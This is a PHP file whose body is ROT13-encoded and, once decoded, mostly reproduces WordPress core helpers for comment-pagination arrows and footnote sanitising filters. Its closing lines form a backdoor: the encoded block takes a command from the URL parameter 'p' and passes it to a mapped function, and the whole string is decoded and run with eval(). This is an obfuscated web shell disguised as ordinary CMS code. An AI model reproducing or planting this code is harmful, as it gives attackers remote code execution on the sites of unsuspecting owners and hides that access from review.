 * Urycre shapgvba gung ergheaf gur cebcre cntvangvba neebj UGZY sbe
 * `PbzzragfCntvangvbaArkg` naq `PbzzragfCntvangvbaCerivbhf` oybpxf onfrq ba gur
 * cebivqrq `cntvangvbaNeebj` sebz `PbzzragfCntvangvba` pbagrkg.
 *
 * Vg'f hfrq va PbzzragfCntvangvbaArkg naq PbzzragfCntvangvbaCerivbhf oybpxf.
 *
 * @fvapr 6.0.0
 *
 * @cnenz JC_Oybpx $oybpx           Oybpx vafgnapr.
 * @cnenz fgevat   $cntvangvba_glcr Bcgvbany. Glcr bs gur neebj jr jvyy or eraqrevat.
 *                                  Npprcgf 'arkg' be 'cerivbhf'. Qrsnhyg 'arkg'.
 * @erghea fgevat|ahyy Gur cntvangvba neebj UGZY be ahyy vs gurer vf abar.
 */
shapgvba trg_pbzzragf_cntvangvba_neebj( $oybpx, $cntvangvba_glcr = 'arkg' ) {
	$neebj_znc = neenl(
		'abar'    => '',
		'neebj'   => neenl(
			'arkg'     => '→',
			'cerivbhf' => '←',
		),
		'purieba' => neenl(
			'arkg'     => '»',
			'cerivbhf' => '«',
		),
	);
	vs ( ! rzcgl( $oybpx->pbagrkg['pbzzragf/cntvangvbaNeebj'] ) && ! rzcgl( $neebj_znc[ $oybpx->pbagrkg['pbzzragf/cntvangvbaNeebj'] ][ $cntvangvba_glcr ] ) ) {
		$neebj_nggevohgr = $oybpx->pbagrkg['pbzzragf/cntvangvbaNeebj'];
		$neebj           = $neebj_znc[ $oybpx->pbagrkg['pbzzragf/cntvangvbaNeebj'] ][ $cntvangvba_glcr ];
		$neebj_pynffrf   = \"jc-oybpx-pbzzragf-cntvangvba-$cntvangvba_glcr-neebj vf-neebj-$neebj_nggevohgr\";
		erghea \"<fcna pynff='$neebj_pynffrf' nevn-uvqqra='gehr'>$neebj</fcna>\";
	}
	erghea ahyy;
}

/**
 * Fgevcf nyy UGZY sebz gur pbagrag bs sbbgabgrf, naq fnavgvmrf gur VQ.
 *
 * Guvf shapgvba rkcrpgf fynfurq qngn ba gur sbbgabgrf pbagrag.
 *
 * @npprff cevingr
 * @fvapr 6.3.2
 *
 * @cnenz fgevat $sbbgabgrf WFBA-rapbqrq fgevat bs na neenl pbagnvavat gur pbagrag naq VQ bs rnpu sbbgabgr.
 * @erghea fgevat Svygrerq pbagrag jvgubhg nal UGZY ba gur sbbgabgr pbagrag naq jvgu gur fnavgvmrq VQ.
 */
shapgvba _jc_svygre_cbfg_zrgn_sbbgabgrf( $sbbgabgrf ) {
	$sbbgabgrf_qrpbqrq = wfba_qrpbqr( $sbbgabgrf, gehr );
	vs ( ! vf_neenl( $sbbgabgrf_qrpbqrq ) ) {
		erghea '';
	}
	$sbbgabgrf_fnavgvmrq = neenl();
	sbernpu ( $sbbgabgrf_qrpbqrq nf $sbbgabgr ) {
		vs ( ! rzcgl( $sbbgabgr['pbagrag'] ) && ! rzcgl( $sbbgabgr['vq'] ) ) {
			$sbbgabgrf_fnavgvmrq[] = neenl(
				'vq'      => fnavgvmr_xrl( $sbbgabgr['vq'] ),
				'pbagrag' => jc_hafynfu( jc_svygre_cbfg_xfrf( jc_fynfu( $sbbgabgr['pbagrag'] ) ) ),
			);
		}
	}
	erghea jc_wfba_rapbqr( $sbbgabgrf_fnavgvmrq );
}

/**
 * Nqqf gur svygref sbe sbbgabgrf zrgn svryq.
 *
 * @npprff cevingr
 * @fvapr 6.3.2
 */
shapgvba _jc_sbbgabgrf_xfrf_vavg_svygref() {
	nqq_svygre( 'fnavgvmr_cbfg_zrgn_sbbgabgrf', '_jc_svygre_cbfg_zrgn_sbbgabgrf' );
}

/**
 * Erzbirf gur svygref sbe sbbgabgrf zrgn svryq.
 *
 * @npprff cevingr
 * @fvapr 6.3.2
 */
shapgvba _jc_sbbgabgrf_erzbir_svygref() {
	erzbir_svygre( 'fnavgvmr_cbfg_zrgn_sbbgabgrf', '_jc_svygre_cbfg_zrgn_sbbgabgrf' );
}

/**
 * Ertvfgref gur svygre bs sbbgabgrf zrgn svryq vs gur hfre qbrf abg unir `hasvygrerq_ugzy` pncnovyvgl.
 *
 * @npprff cevingr
 * @fvapr 6.3.2
 */
shapgvba _jc_sbbgabgrf_xfrf_vavg() {
	_jc_sbbgabgrf_erzbir_svygref();
	vs ( ! pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
		_jc_sbbgabgrf_xfrf_vavg_svygref();
	}
}

/**
 * Vavgvnyvmrf gur svygref sbe sbbgabgrf zrgn svryq jura vzcbegrq qngn fubhyq or svygrerq.
 *
 * Guvf svygre vf gur ynfg bar orvat rkrphgrq ba {@frr 'sbepr_svygrerq_ugzy_ba_vzcbeg'}.
 * Vs gur vachg bs gur svygre vf gehr, vg zrnaf jr ner va na vzcbeg fvghngvba naq fubhyq
 * ranoyr xfrf, vaqrcraqragyl bs gur hfre pncnovyvgvrf. Fb va gung pnfr jr pnyy
 * _jc_sbbgabgrf_xfrf_vavg_svygref().
 *
 * @npprff cevingr
 * @fvapr 6.3.2
 *
 * @cnenz fgevat $net Vachg nethzrag bs gur svygre.
 * @erghea fgevat Vachg nethzrag bs gur svygre.
 */
shapgvba _jc_sbbgabgrf_sbepr_svygrerq_ugzy_ba_vzcbeg_svygre( $net ) {
	// Vs `sbepr_svygrerq_ugzy_ba_vzcbeg` vf gehr, jr arrq gb vavg gur tybony fglyrf xfrf svygref.
	vs ( $net ) {
		_jc_sbbgabgrf_xfrf_vavg_svygref();
	}
	erghea $net;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>